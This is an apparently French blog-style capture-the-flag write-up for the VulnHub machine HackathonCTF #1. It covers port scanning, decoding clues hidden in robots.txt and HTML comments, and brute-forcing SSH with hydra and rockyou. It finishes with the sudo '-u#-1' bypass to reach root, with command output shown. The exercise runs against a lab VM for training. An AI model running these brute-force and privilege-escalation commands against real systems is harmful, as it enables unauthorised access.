---
title: "Solution du CTF HackathonCTF #1 de VulnHub"
tags: [CTF, VulnHub]
---

[HackathonCTF #1](https://vulnhub.com/entry/hackathonctf-1,591/) est un CTF mis en ligne en octobre 2020 sur *VulnHub*. Il se compose d'une première partie nécessitant de l'énumération, un peu comme un jeu de piste puis une escalade de privilèges via un exploit. Rien de bien compliqué.

## Puzzle

```
Nmap scan report for 192.168.56.201
Host is up (0.00018s latency).
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.2
23/tcp   open  telnet  Linux telnetd
80/tcp   open  http    Apache httpd 2.4.7 ((Ubuntu))
| http-enum: 
|_  /robots.txt: Robots file
7223/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
```

On obtient une erreur 404 si on demande la page d'index du serveur web. Le fichier `robots.txt` retourne quant à lui 3 paths et un code base64 :

```
user-agent: *
Disallow: /ctf

user-agent: *
Disallow: /ftc

user-agent: *
Disallow: /sudo

c3NoLWJydXRlZm9yY2Utc3Vkb2l0Cg==
```

Ce dernier se décode en `ssh-bruteforce-sudoit`.

Les URLs mentionnées ne fonctionnent pas, mais en énumérant (avec `feroxbuster`) le serveur pour les extensions php et html on comprend qu'il faut rajouter le suffixe `.html` :

```
200        0l        0w        0c http://192.168.56.201/ctf.html
200       24l       26w      154c http://192.168.56.201/ftc.html
```

Le fichier `ftc.html` contient les lignes suivantes :

```html
<h1>what are you looking for??????</h1>

</body>
<!-- #117
#115
#101
#32
#114
#111
#99
#107
#121
#111
#117
#46
#116
#120
#116
-->
```

Vraisemblablement le code décimal pour les caractères d'un message. Je vais utiliser Python pour décoder :

```python
>>> data = """#117
... #115
... #101
... #32
... #114
... #111
... #99
... #107
... #121
... #111
... #117
... #46
... #116
... #120
... #116"""
>>> "".join([chr(int(s[1:])) for s in  data.splitlines()])
'use rockyou.txt'
```

Dernière étape de notre recherche, le fichier `sudo.html` qui contient la mention `#uname : test`

On s'applique donc à bruteforcer l'utilisateur `test` avec la wordlist `rockyou` :

```console
$ hydra -l test -P wordlists/rockyou.txt ssh://192.168.56.201:7223
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344381 login tries (l:1/p:14344381), ~896524 tries per task
[DATA] attacking ssh://192.168.56.201:7223/
[STATUS] 156.00 tries/min, 156 tries in 00:01h, 14344227 to do in 1532:31h, 14 active
[STATUS] 115.00 tries/min, 345 tries in 00:03h, 14344038 to do in 2078:51h, 14 active
[7223][ssh] host: 192.168.56.201   login: test   password: jordan23
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 2 final worker threads did not complete until end.
[ERROR] 2 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished
```

## Subzero

L'utilisateur peut exécuter des commandes en tant que n'importe quel utilisateur sauf root.

```console
test@ctf:~$ sudo -l
[sudo] password for test: 
Matching Defaults entries for test on ctf:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User test may run the following commands on ctf:
    (ALL, !root) ALL
```

J'ai d'abord obtenu un shell pour un utilisateur nommé `ctf` sur le système. Il y a quelques entrées dans son historique bash :

```bash
cd tmp/
ls
cd ..
cd media/
ls
cd floppy
ls
sudo mkdir media
ls
cd media/
sudo mkdir imp
ls
cd imp/
sudo password
nano sudo password
sudo nano pass
echo 'CTFdfrGHYjUsSsKK@12345' | base64
echo 'CTFdfrGHYjUsSsKK@12345' | base64 >pass.txt
sudo echo 'CTFdfrGHYjUsSsKK@12345' | base64 >pass.txt
```

Je retrouve bien le fichier `pass.txt` sur le disque, mais le mot de passe n'est accepté ni pou `ctf` ni pour `root`...

J'ai aussi cherché avec la commande `find / -type f -not -user root -ls 2> /dev/null | grep -v /proc` si certains fichiers faisaient partie d'un groupe particulier et pouvaient me permettrait d'élever mes privilèges, mais sans succès.

Finalement dans l'historique bash de l'utilisateur `test` on pouvait voir cette commande :

```bash
sudo -u#-1 /bin/bash
```

Elle fait référence à une faille de type integer overflow dans sudo : [sudo 1.8.27 - Security Bypass - Linux local Exploit](https://www.exploit-db.com/exploits/47502)

```console
test@ctf:~$ sudo -u#-1 /bin/bash
root@ctf:~# id
uid=0(root) gid=0(root) groups=0(root)
```

C'était bien la marche à suivre.
